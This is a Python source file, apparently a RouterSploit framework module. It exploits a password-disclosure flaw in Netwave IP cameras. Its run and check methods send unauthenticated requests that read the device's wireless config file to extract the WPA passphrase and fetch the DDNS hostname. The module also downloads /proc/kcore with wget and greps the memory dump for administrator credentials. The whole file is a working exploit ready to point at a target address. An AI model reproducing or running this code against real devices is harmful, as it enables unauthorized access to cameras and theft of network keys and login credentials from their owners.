import subprocess
import time

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_info,
    http_request,
)


class Exploit(exploits.Exploit):
    """
    Netwave IP Camera - Password Disclosure
    """
    __info__ = {
        'name': 'Netwave_IP_camera',
        'description': 'This exploit will try to retrieve WPA password and ddns host name'
                       'Also it would try to read memory leak in order to find username and password',
        'authors': [
            'renos stoikos <rstoikos[at]gmail.com>'  # routesploit module
            'spiritnull',  # exploit-db.com exploit
        ],
        'references': [
            'https://www.exploit-db.com/exploits/41236/',
        ],
        'devices': [
            'Netwave IP Camera',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url1 = "{}:{}//etc/RT2870STA.dat".format(self.target, self.port)
            url2 = "{}:{}/get_status.cgi".format(self.target, self.port)
            url3 = "{}:{}//proc/kcore".format(self.target, self.port)

            response = http_request(method="GET", url=url1)
            if "WPAPSK" in response.text:
                print_success("WPA Password is in this text:")
                print_success(response.text)
            else:
                print_error("Could not find WPA password")

            print_info("Trying to gather more info")
            response = http_request(method="GET", url=url2)
            if "ddns_host" in response.text:
                print_success("ddns host name:")
                print_success(response.text)
            else:
                print_error("could not read ddns host name")

            print_info("Trying to find username and password from running memory leak")
            print_info("This could take some time")
            with open("/tmp/tempfile", "wb") as out:
                proc = subprocess.Popen(["wget", "-qO-", url3], stdout=out, stderr=subprocess.PIPE, shell=False)
            time.sleep(120)
            print_success("possible lines that might contain username and pass are printed:")
            proc2 = subprocess.Popen(["strings /tmp/tempfile | grep -A 3 admin"], shell=True)
            time.sleep(30)
            proc.kill()
            proc2.kill()

    def check(self):
        url1 = "{}:{}//etc/RT2870STA.dat".format(self.target, self.port)
        url2 = "{}:{}/get_status.cgi".format(self.target, self.port)

        response1 = http_request(method="GET", url=url1)
        response2 = http_request(method="GET", url=url2)
        if response1 and response2 is None:
            return False  # target is not vulnerable

        if response1.status_code == 200 and "WPAPSK" in response1.text or response2.status_code == 200 and "ddns" in response2.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
